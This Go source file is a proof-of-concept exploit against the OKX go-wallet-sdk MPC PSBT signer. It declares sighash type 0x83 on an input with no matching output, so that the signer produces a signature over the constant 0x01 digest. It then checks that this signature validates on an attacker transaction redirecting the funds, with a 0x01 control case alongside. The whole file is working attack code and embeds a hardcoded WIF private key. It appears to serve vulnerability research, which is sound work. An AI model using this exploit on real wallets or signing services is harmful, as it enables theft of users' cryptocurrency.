package main

import (
	"bytes"
	"encoding/hex"
	"fmt"

	"github.com/btcsuite/btcd/btcec/v2"
	"github.com/btcsuite/btcd/btcec/v2/ecdsa"
	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/btcutil/psbt"
	"github.com/btcsuite/btcd/chaincfg/chainhash"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/okx/go-wallet-sdk/coins/bitcoin"
)

const wif = "cPnvkvUYyHcSSS26iD1dkrJdV7k1RoUqJLhn3CYxpo398PdLVE22"

func buildHostile(declared byte) (string, []byte, *btcec.PublicKey, error) {
	w, _ := btcutil.DecodeWIF(wif)
	pub := w.PrivKey.PubKey()
	h := btcutil.Hash160(pub.SerializeCompressed())
	spk, _ := bitcoin.PayToPubKeyHashScript(h)
	fund := wire.NewMsgTx(2)
	fund.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x81}, Index: 0}, nil, nil))
	fund.AddTxOut(wire.NewTxOut(100000, spk))
	tx := wire.NewMsgTx(2)
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x82}, Index: 0}, nil, nil))
	tx.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: fund.TxHash(), Index: 0}, nil, nil))
	tx.AddTxOut(wire.NewTxOut(90000, spk))
	pkt, err := psbt.NewFromUnsignedTx(tx)
	if err != nil { return "", nil, nil, err }
	pkt.Inputs[0].NonWitnessUtxo = fund
	pkt.Inputs[1].NonWitnessUtxo = fund
	pkt.Inputs[1].SighashType = txscript.SigHashType(declared)
	pkt.Inputs[0].SighashType = 0x01
	var b bytes.Buffer
	if err := pkt.Serialize(&b); err != nil { return "", nil, nil, err }
	return hex.EncodeToString(b.Bytes()), spk, pub, nil
}

func attackerValid(sig []byte, spk []byte, pub *btcec.PublicKey) bool {
	ht := txscript.SigHashType(sig[len(sig)-1])
	atk := wire.NewMsgTx(2)
	atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x91}, Index: 0}, nil, nil))
	atk.AddTxIn(wire.NewTxIn(&wire.OutPoint{Hash: chainhash.Hash{0x92}, Index: 0}, nil, nil))
	attackerScript, _ := bitcoin.PayToPubKeyHashScript(bytes.Repeat([]byte{0x44}, 20))
	atk.AddTxOut(wire.NewTxOut(99900, attackerScript))
	dig, err := txscript.CalcSignatureHash(spk, ht, atk, 1)
	if err != nil { return false }
	sg, e := ecdsa.ParseDERSignature(sig[:len(sig)-1])
	return e == nil && sg.Verify(dig, pub)
}

func run(label string, declared byte) {
	psbtHex, spk, pub, err := buildHostile(declared)
	if err != nil { fmt.Printf("CELL %s build err=%v\n", label, err); return }
	w, _ := btcutil.DecodeWIF(wif)
	pubHex := hex.EncodeToString(pub.SerializeCompressed())

	unsigned, err := bitcoin.GenerateMPCUnsignedPSBT(psbtHex, pubHex)
	if err != nil { fmt.Printf("CELL %s unsigned err=%v\n", label, err); return }
	digestHex := unsigned.SignHashList[1]
	digest, _ := hex.DecodeString(digestHex)
	constant := len(digest) == 32 && digest[0] == 1
	for i := 1; i < 32 && constant; i++ { constant = digest[i] == 0 }
	fmt.Printf("CELL %s declared=0x%02x signer_digest=%s digest_is_constant_01=%v\n", label, declared, digestHex, constant)

	sig := ecdsa.Sign(w.PrivKey, digest)
	rv := sig.R()
	sv := sig.S()
	rb, sb := rv.Bytes(), sv.Bytes()
	sigEntry := hex.EncodeToString(rb[:]) + hex.EncodeToString(sb[:])

	signed, err := bitcoin.GenerateMPCSignedPSBT(psbtHex, pubHex, []string{sigEntry, sigEntry})
	if err != nil { fmt.Printf("CELL %s signed err=%v\n", label, err); return }
	raw, _ := hex.DecodeString(signed.PsbtTx)
	p, err := psbt.NewFromRawBytes(bytes.NewReader(raw), false)
	if err != nil { fmt.Printf("CELL %s decode err=%v\n", label, err); return }
	var got []byte
	for _, ps := range p.Inputs[1].PartialSigs { got = ps.Signature }
	if got == nil { fmt.Printf("CELL %s no partial sig on victim input\n", label); return }
	fmt.Printf("CELL %s mpc_signed_attacker_tx_sig_valid=%v\n", label, attackerValid(got, spk, pub))
}

func main() {
	run("M-direct-0x83", 0x83)
	run("M-control-0x01", 0x01)
}
